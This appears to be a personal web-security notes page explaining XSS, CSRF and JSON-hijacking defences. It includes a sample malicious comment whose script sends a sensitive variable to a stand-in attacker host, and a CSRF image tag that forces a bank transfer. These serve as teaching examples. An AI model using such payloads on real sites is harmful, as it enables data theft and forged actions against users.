---
layout: page
title: Web Security Notes
---

This is my own reference for any security-related advice I find I must keep in
mind when writing web-facing web apps and services.

[This page's source is visible on
GitHub](https://github.com/jennings/jennings.github.io). If I screwed up, send
a pull request and I'll fix it up.


## Protect against XSS

[Cross-Site Scripting](http://en.wikipedia.org/wiki/Cross-site_scripting)
refers to an attacker convincing a vulnerable website to send malicious
JavaScript to a victim. For example, if a comment system allows HTML, an
attacker can submit the following comment:

    This is an evil comment.
    <script>
        jQuery.ajax({
            url: "http://evil.example.com",
            data: someSensitiveVariable
        });
    </script>

Any victim who loads the page containing this comment will send
`someSensitiveVariable` to `evil.example.com`.


## Protect against CSRF

[Cross-Site Request
Forgery](http://en.wikipedia.org/wiki/Cross-site_request_forgery) is when a
malicious site convinces the victim's browser to make a request that performs
some action.

For example, if a bank transaction can be accomplished by making a GET request,
the following image element on a malicious page will do so:

    <img src="https://bank.example.com/api/transfer?to=evilaccount&amount=1000.00">

To protect against this:

* Include authentication tokens with each transaction request (if the attacker has
  access to the authentication token, they are already effectively logged in as that
  user).
* Require a secret, user-specific token with any request that has a side-effect
  (for example, a hidden form field). An attacker will not be able to acquire
  this token.


## Protect against JSON hijacking

When server-side code is returning a JavaScript array, include a `while(1);` at the
beginning of the request:

    Request:
    GET /api/posts

    Response:
    while(1);[{"id":1},{"id":2}]

This protects against third parties adding a `<script>` tag to their own pages
and executing the result. [Phil Haack describes the exploit
here](http://haacked.com/archive/2009/06/25/json-hijacking.aspx/).

Same-origin code can see the textual content of the request and strip the
leading `while(1);`.
